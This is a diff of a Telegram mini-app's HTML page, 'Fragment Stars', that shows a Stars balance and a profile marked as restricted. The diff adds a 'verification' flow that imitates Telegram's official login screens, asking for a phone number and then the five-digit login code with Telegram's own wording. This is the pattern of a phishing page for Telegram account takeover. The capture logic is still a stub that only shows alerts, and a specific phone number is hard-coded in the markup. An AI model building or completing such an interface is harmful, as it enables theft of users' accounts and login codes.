@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Fragment Stars</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     :root {
       --bg: #0a0a0f;
@@ -14,8 +14,11 @@
       --accent: #00d4ff;
       --purple: #a855f7;
       --blue: #3b82f6;
-      --neon: 0 0 20px rgba(168, 85, 247, 0.6);
-      --warning: #f59e0b;
+      --tg-blue: #2481cc;
+      --tg-bg: #ffffff;
+      --tg-text: #000000;
+      --tg-hint: #707579;
+      --tg-border: #d1d1d1;
     }
 
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -46,8 +49,7 @@
     }
 
     .spinner {
-      width: 48px;
-      height: 48px;
+      width: 48px; height: 48px;
       border: 4px solid #2a2a3a;
       border-top: 4px solid var(--accent);
       border-radius: 50%;
@@ -55,343 +57,172 @@
       margin-bottom: 16px;
     }
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+    @keyframes spin { to { transform: rotate(360deg); } }
 
-    .loader-text {
-      font-size: 16px;
-      color: #94a3b8;
-      margin-bottom: 16px;
-    }
+    .loader-text { font-size: 16px; color: #94a3b8; margin-bottom: 16px; }
 
-    .progress-bar {
-      width: 200px;
-      height: 6px;
-      background: #2a2a3a;
-      border-radius: 3px;
-      overflow: hidden;
-    }
-
-    .progress-fill {
-      width: 0%;
-      height: 100%;
-      background: linear-gradient(90deg, var(--purple), var(--blue));
-      border-radius: 3px;
-      transition: width 0.1s ease;
-    }
+    .progress-bar { width: 200px; height: 6px; background: #2a2a3a; border-radius: 3px; overflow: hidden; }
+    .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--purple), var(--blue)); border-radius: 3px; transition: width 0.1s ease; }
 
     /* === ВКЛАДКИ === */
     .tab-content {
-      position: absolute;
-      top: 0; left: 0; right: 0;
+      position: absolute; top: 0; left: 0; right: 0;
       padding: 20px 16px;
-      display: none;
-      opacity: 0;
-      transform: translateY(20px);
+      display: none; opacity: 0; transform: translateY(20px);
       transition: opacity 0.4s ease, transform 0.4s ease;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      width: 100%;
-      height: calc(100% - 80px);
+      flex-direction: column; align-items: center; justify-content: center;
+      width: 100%; height: calc(100% - 80px);
     }
 
-    .tab-content.active {
-      display: flex;
-      opacity: 1;
-      transform: translateY(0);
-      z-index: 1;
-    }
+    .tab-content.active { display: flex; opacity: 1; transform: translateY(0); z-index: 1; }
 
     /* === БАЛАНС === */
     .balance-card {
       background: linear-gradient(145deg, #1a1a2e, #16213e);
-      border-radius: 28px;
-      padding: 40px 24px;
-      text-align: center;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.4), var(--neon);
-      width: 90%;
-      max-width: 400px;
-      position: relative;
-      overflow: hidden;
+      border-radius: 28px; padding: 40px 24px; text-align: center;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+      width: 90%; max-width: 400px;
     }
 
-    .balance-card::before {
-      content: '';
-      position: absolute;
-      top: -50%; left: -50%;
-      width: 200%; height: 200%;
-      background: radial-gradient(circle, rgba(168, 85, 247, 0.15), transparent);
-      animation: glow 6s infinite;
-      pointer-events: none;
-    }
-
-    @keyframes glow {
-      0%, 100% { transform: translate(0, 0); }
-      50% { transform: translate(20%, 20%); }
-    }
-
-    .star-container {
-      width: 120px;
-      height: 120px;
-      margin: 0 auto 24px;
-      filter: drop-shadow(0 0 20px var(--purple));
-      animation: starPulse 3s infinite;
-    }
-
-    @keyframes starPulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-    }
-
-    .star-icon {
-      width: 100%;
-      height: 100%;
-    }
+    .star-icon { width: 120px; height: 120px; filter: drop-shadow(0 0 20px var(--purple)); animation: pulse 2s infinite; }
+    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
 
     .balance-amount {
-      font-size: 64px;
-      font-weight: 700;
+      font-size: 64px; font-weight: 700;
       background: linear-gradient(90deg, var(--purple), var(--blue));
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
       margin-bottom: 8px;
-      animation: textPulse 2s infinite;
     }
 
-    @keyframes textPulse {
-      0%, 100% { filter: brightness(1); }
-      50% { filter: brightness(1.3); }
-    }
+    .balance-label { font-size: 18px; color: #94a3b8; margin-bottom: 32px; }
 
-    .balance-label {
-      font-size: 18px;
-      color: #94a3b8;
-      margin-bottom: 24px;
-    }
-
-    .balance-actions {
-      display: flex;
-      gap: 12px;
-    }
-
+    .balance-actions { display: flex; gap: 12px; }
     .action-btn {
-      flex: 1;
-      padding: 14px;
-      border: none;
-      border-radius: 16px;
-      font-weight: 600;
-      font-size: 16px;
-      cursor: pointer;
-      transition: all 0.3s;
+      flex: 1; padding: 14px; border: none; border-radius: 16px;
+      font-weight: 600; font-size: 16px; cursor: pointer;
     }
-
-    .topup-btn {
-      background: linear-gradient(90deg, var(--purple), var(--blue));
-      color: white;
-      box-shadow: 0 8px 20px rgba(168, 85, 247, 0.3);
-    }
-
-    .topup-btn:active {
-      transform: translateY(2px);
-    }
-
-    .withdraw-btn {
-      background: rgba(255,255,255,0.1);
-      color: #ccc;
-      border: 1px solid rgba(255,255,255,0.2);
-    }
+    .topup-btn { background: linear-gradient(90deg, var(--purple), var(--blue)); color: white; }
+    .withdraw-btn { background: rgba(255,255,255,0.1); color: #ccc; border: 1px solid rgba(255,255,255,0.2); }
 
     /* === ПРОФИЛЬ === */
     .profile-card {
       background: linear-gradient(145deg, #1a1a2e, #16213e);
-      border-radius: 28px;
-      padding: 32px 24px;
-      text-align: center;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.4), var(--neon);
-      position: relative;
-      overflow: hidden;
-    }
-
-    .profile-card::before {
-      content: '';
-      position: absolute;
-      top: -50%; left: -50%;
-      width: 200%; height: 200%;
-      background: radial-gradient(circle, rgba(168, 85, 247, 0.15), transparent);
-      animation: glow 6s infinite;
-      pointer-events: none;
-    }
-
-    .avatar {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      margin: 0 auto 16px;
-      overflow: hidden;
-      box-shadow: var(--neon);
-      animation: avatarPulse 3s infinite;
-    }
-
-    .avatar img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-
-    @keyframes avatarPulse {
-      0%, 100% { box-shadow: 0 0 20px rgba(168, 85, 247, 0.6); }
-      50% { box-shadow: 0 0 30px rgba(168, 85, 247, 0.9); }
-    }
-
-    .username {
-      font-size: 24px;
-      font-weight: 700;
-      background: linear-gradient(90deg, var(--purple), var(--blue));
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 8px;
-    }
-
-    .join-date {
-      font-size: 14px;
-      color: #94a3b8;
-      margin-bottom: 24px;
-    }
-
-    .verification-status {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      font-size: 14px;
-      color: var(--warning);
-      margin-bottom: 16px;
-    }
-
-    .status-dot {
-      width: 10px;
-      height: 10px;
-      background: var(--warning);
-      border-radius: 50%;
-      animation: blink 1.5s infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.4; }
-    }
-
-    .verify-btn {
-      background: linear-gradient(90deg, var(--purple), var(--blue));
-      color: white;
-      font-weight: 600;
-      font-size: 16px;
-      padding: 14px;
-      border: none;
-      border-radius: 16px;
-      width: 100%;
-      cursor: pointer;
-      box-shadow: 0 8px 20px rgba(168, 85, 247, 0.3);
-    }
-
-    /* === МОДАЛЬНОЕ ОКНО — ТЕСТОВАЯ ОТПРАВКА КОДА === */
-    .modal {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.8);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-      opacity: 0;
-      transition: opacity 0.3s ease;
-    }
-
-    .modal.active {
-      display: flex;
-      opacity: 1;
-    }
-
-    .modal-content {
-      background: var(--card);
-      border-radius: 20px;
-      padding: 24px;
-      width: 90%;
-      max-width: 360px;
-      text-align: center;
+      border-radius: 28px; padding: 32px 24px; text-align: center;
+      width: 90%; max-width: 400px;
       box-shadow: 0 20px 40px rgba(0,0,0,0.4);
     }
 
-    .modal-title {
-      font-size: 18px;
-      font-weight: 600;
-      margin-bottom: 16px;
-      color: var(--text);
+    .avatar {
+      width: 100px; height: 100px; border-radius: 50%; margin: 0 auto 16px;
+      overflow: hidden; box-shadow: 0 0 20px rgba(168, 85, 247, 0.6);
     }
+    .avatar img { width: 100%; height: 100%; object-fit: cover; }
 
-    .modal-input {
-      width: 100%;
-      padding: 14px;
-      border: 1px solid rgba(255,255,255,0.1);
-      background: rgba(255,255,255,0.05);
-      border-radius: 12px;
-      color: var(--text);
-      font-size: 16px;
-      text-align: center;
-      margin-bottom: 16px;
-    }
-
-    .modal-btn {
+    .username {
+      font-size: 24px; font-weight: 700;
       background: linear-gradient(90deg, var(--purple), var(--blue));
-      color: white;
-      font-weight: 600;
-      font-size: 16px;
-      padding: 14px;
-      border: none;
-      border-radius: 12px;
-      width: 100%;
-      cursor: pointer;
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      margin-bottom: 8px;
     }
 
-    .modal-close {
-      margin-top: 16px;
-      color: #94a3b8;
-      font-size: 14px;
-      cursor: pointer;
+    .join-date { font-size: 14px; color: #94a3b8; margin-bottom: 24px; }
+
+    .verification-status {
+      display: flex; align-items: center; justify-content: center;
+      gap: 8px; font-size: 14px; color: #f59e0b; margin-bottom: 16px;
+    }
+    .status-dot {
+      width: 10px; height: 10px; background: #f59e0b;
+      border-radius: 50%; animation: blink 1.5s infinite;
+    }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+    .verify-btn {
+      background: linear-gradient(90deg, var(--purple), var(--blue));
+      color: white; font-weight: 600; font-size: 16px;
+      padding: 14px; border: none; border-radius: 16px;
+      width: 100%; cursor: pointer;
+    }
+
+    /* === МОДАЛЬНОЕ ОКНО — ВВОД НОМЕРА (как в TG) === */
+    .modal {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.8); display: none; align-items: center;
+      justify-content: center; z-index: 1000; opacity: 0; transition: opacity 0.3s ease;
+    }
+    .modal.active { display: flex; opacity: 1; }
+
+    .modal-content {
+      background: var(--tg-bg); color: var(--tg-text);
+      border-radius: 12px; padding: 24px; width: 90%; max-width: 360px;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .modal-title {
+      font-size: 20px; font-weight: 600; margin-bottom: 8px;
+    }
+
+    .modal-hint {
+      font-size: 14px; color: var(--tg-hint); margin-bottom: 24px;
+    }
+
+    .country-select {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 12px 0; border-bottom: 1px solid var(--tg-border);
+      font-size: 17px; cursor: pointer;
+    }
+
+    .phone-input-group {
+      display: flex; align-items: center; margin-top: 16px; gap: 8px;
+    }
+
+    .phone-prefix {
+      font-size: 17px; color: var(--tg-blue); min-width: 40px;
+    }
+
+    .phone-input {
+      flex: 1; border: none; outline: none; font-size: 17px;
+      border-bottom: 2px solid var(--tg-blue); padding: 8px 0;
+    }
+
+    .continue-btn {
+      margin-top: 32px; background: var(--tg-blue); color: white;
+      font-weight: 600; font-size: 17px; padding: 14px; border: none;
+      border-radius: 8px; width: 100%; cursor: pointer;
+    }
+
+    /* === ШАГ 2: ВВОД КОДА === */
+    .code-input-container {
+      display: flex; justify-content: center; gap: 8px; margin: 24px 0;
+    }
+
+    .code-digit {
+      width: 48px; height: 58px; border: 2px solid #e0e0e0;
+      border-radius: 8px; font-size: 24px; font-weight: 600;
+      text-align: center; background: white;
+    }
+
+    .code-digit:focus {
+      border-color: var(--tg-blue); outline: none;
+    }
+
+    .resend-link {
+      color: var(--tg-blue); font-size: 15px; text-align: center; margin-top: 16px; cursor: pointer;
     }
 
     /* === BOTTOM NAV === */
     .bottom-nav {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: rgba(26, 26, 46, 0.95);
-      backdrop-filter: blur(10px);
+      position: fixed; bottom: 0; left: 0; right: 0;
+      background: rgba(26, 26, 46, 0.95); backdrop-filter: blur(10px);
       border-top: 1px solid rgba(255,255,255,0.1);
-      display: flex;
-      justify-content: space-around;
-      padding: 12px 0 20px;
-      z-index: 1000;
+      display: flex; justify-content: space-around; padding: 12px 0 20px; z-index: 1000;
     }
 
     .nav-item {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 6px;
-      color: #64748b;
-      font-size: 13px;
-      font-weight: 600;
-      flex: 1;
-      cursor: pointer;
-      transition: color 0.3s ease;
+      display: flex; flex-direction: column; align-items: center;
+      gap: 6px; color: #64748b; font-size: 13px; font-weight: 600;
+      flex: 1; cursor: pointer; transition: color 0.3s ease;
     }
-
     .nav-item.active { color: var(--accent); }
     .nav-item svg { width: 28px; height: 28px; }
   </style>
@@ -410,9 +241,7 @@
   <!-- Balance Tab -->
   <div id="balance" class="tab-content active">
     <div class="balance-card">
-      <div class="star-container">
-        <img src="Local/Star Symbol/Star.png" alt="Star" class="star-icon">
-      </div>
+      <img src="Local/Star Symbol/Star.png" alt="Star" class="star-icon">
       <div class="balance-amount">0</div>
       <div class="balance-label">Telegram Stars</div>
       <div class="balance-actions">
@@ -422,7 +251,7 @@
     </div>
   </div>
 
-  <!-- Profile Tab — ТЕСТОВАЯ ОТПРАВКА КОДА -->
+  <!-- Profile Tab -->
   <div id="profile" class="tab-content">
     <div class="profile-card">
       <div class="avatar" id="avatar">
@@ -436,7 +265,7 @@
         <span>Ограниченная</span>
       </div>
 
-      <button class="verify-btn" onclick="openTestModal()">Пройти верификацию</button>
+      <button class="verify-btn" onclick="openPhoneModal()">Пройти верификацию</button>
     </div>
   </div>
 
@@ -449,16 +278,43 @@
     </div>
   </div>
 
-  <!-- МОДАЛЬНОЕ ОКНО — ТЕСТОВАЯ ОТПРАВКА КОДА -->
-  <div id="testModal" class="modal">
+  <!-- ШАГ 1: ВВОД НОМЕРА -->
+  <div id="phoneModal" class="modal">
     <div class="modal-content">
-      <div class="modal-title">Тестовая верификация</div>
-      <p style="color:#94a3b8;font-size:14px;margin-bottom:16px;">
-        Введи любой 6-значный код — он "отправится"
-      </p>
-      <input type="text" class="modal-input" id="testCode" placeholder="123456" maxlength="6">
-      <button class="modal-btn" onclick="sendTestCode()">Отправить код</button>
-      <div class="modal-close" onclick="closeTestModal()">Закрыть</div>
+      <div class="modal-title">Ваш номер телефона</div>
+      <div class="modal-hint">Проверьте код страны и введите свой номер телефона.</div>
+
+      <div class="country-select" onclick="alert('Выбор страны (тест)')">
+        <span>Russian Federation</span>
+        <span>▼</span>
+      </div>
+
+      <div class="phone-input-group">
+        <div class="phone-prefix">+7</div>
+        <input type="text" class="phone-input" id="phoneInput" placeholder="___ ___ ____" maxlength="12">
+      </div>
+
+      <button class="continue-btn" onclick="goToCodeStep()">Продолжить</button>
+    </div>
+  </div>
+
+  <!-- ШАГ 2: ВВОД КОДА -->
+  <div id="codeModal" class="modal">
+    <div class="modal-content">
+      <div class="modal-title">+7 927 663 0210</div>
+      <div class="modal-hint">Если Вы используете приложение на других устройствах, код для входа был отправлен через Telegram.</div>
+
+      <div class="code-input-container">
+        <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 0)">
+        <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 1)">
+        <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 2)">
+        <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 3)">
+        <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 4)">
+      </div>
+
+      <div class="resend-link" onclick="alert('Код отправлен заново (тест)')">Отправить код по SMS</div>
+
+      <button class="continue-btn" onclick="completeTestVerification()">Продолжить</button>
     </div>
   </div>
 
@@ -481,15 +337,10 @@
   <script>
     // === ПЛАВНЫЕ ПЕРЕХОДЫ ===
     function openTab(tabName) {
-      const tabs = document.querySelectorAll('.tab-content');
-      const navItems = document.querySelectorAll('.nav-item');
-
-      tabs.forEach(t => t.classList.remove('active'));
-      navItems.forEach(i => i.classList.remove('active'));
-
+      document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
       const targetTab = document.getElementById(tabName);
       const targetNav = document.querySelector(`[onclick="openTab('${tabName}')"]`);
-
       targetTab.style.display = 'flex';
       setTimeout(() => {
         targetTab.classList.add('active');
@@ -505,75 +356,68 @@
       const steps = 100;
       const interval = duration / steps;
       let current = 0;
-
       const timer = setInterval(() => {
         current += 1;
         progress.style.width = current + '%';
         if (current >= 100) {
           clearInterval(timer);
           loader.style.opacity = '0';
-          setTimeout(() => {
-            loader.style.display = 'none';
-          }, 600);
+          setTimeout(() => loader.style.display = 'none', 600);
         }
       }, interval);
     });
 
-    // === TELEGRAM WEBAPP — ДАННЫЕ ПОЛЬЗОВАТЕЛЯ ===
+    // === TELEGRAM WEBAPP ===
     if (window.Telegram?.WebApp) {
       Telegram.WebApp.ready();
       Telegram.WebApp.expand();
-
       const user = Telegram.WebApp.initDataUnsafe.user;
       if (user) {
-        const usernameEl = document.getElementById('username');
-        usernameEl.textContent = user.username 
-          ? `@${user.username}` 
-          : (user.first_name || 'Гость');
-
+        document.getElementById('username').textContent = user.username ? `@${user.username}` : (user.first_name || 'Гость');
         if (user.photo_url) {
-          const avatarEl = document.getElementById('avatar');
-          avatarEl.innerHTML = `<img src="${user.photo_url}" alt="Avatar">`;
+          document.getElementById('avatar').innerHTML = `<img src="${user.photo_url}" alt="Avatar">`;
         }
-
         const now = new Date();
-        const date = now.toLocaleDateString('ru-RU');
-        const time = now.toTimeString().slice(0, 8);
-        document.getElementById('joinDate').textContent = `${date} — ${time}`;
+        document.getElementById('joinDate').textContent = `${now.toLocaleDateString('ru-RU')} — ${now.toTimeString().slice(0, 8)}`;
       }
     }
 
-    // === ТЕСТОВАЯ ОТПРАВКА КОДА ===
-    function openTestModal() {
-      document.getElementById('testModal').classList.add('active');
+    // === ШАГ 1: ВВОД НОМЕРА ===
+    function openPhoneModal() {
+      document.getElementById('phoneModal').classList.add('active');
     }
 
-    function closeTestModal() {
-      document.getElementById('testModal').classList.remove('active');
-      document.getElementById('testCode').value = '';
-    }
-
-    function sendTestCode() {
-      const code = document.getElementById('testCode').value.trim();
-      if (code.length !== 6 || isNaN(code)) {
-        alert('Введи 6 цифр!');
+    function goToCodeStep() {
+      const phone = document.getElementById('phoneInput').value.trim();
+      if (!phone || phone.length < 10) {
+        alert('Введите полный номер');
         return;
       }
-
-      // Имитация отправки
-      const btn = event.target;
-      btn.textContent = 'Отправка...';
-      btn.disabled = true;
-
+      document.getElementById('phoneModal').classList.remove('active');
       setTimeout(() => {
-        alert(`Код ${code} "отправлен" на номер! (тест)`);
-        btn.textContent = 'Отправить код';
-        btn.disabled = false;
-        closeTestModal();
-      }, 1500);
+        document.getElementById('codeModal').querySelector('.modal-title').textContent = `+7 ${phone}`;
+        document.getElementById('codeModal').classList.add('active');
+      }, 300);
+    }
+
+    // === ШАГ 2: ВВОД КОДА ===
+    function moveToNext(input, index) {
+      if (input.value.length === 1 && index < 4) {
+        document.querySelectorAll('.code-digit')[index + 1].focus();
+      }
+    }
+
+    function completeTestVerification() {
+      const digits = Array.from(document.querySelectorAll('.code-digit')).map(d => d.value);
+      if (digits.some(d => !d)) {
+        alert('Введите весь код');
+        return;
+      }
+      alert(`Код ${digits.join('')} принят! (тест)`);
+      document.getElementById('codeModal').classList.remove('active');
+      // Здесь потом будет смена статуса
     }
 
   </script>
-
 </body>
 </html>
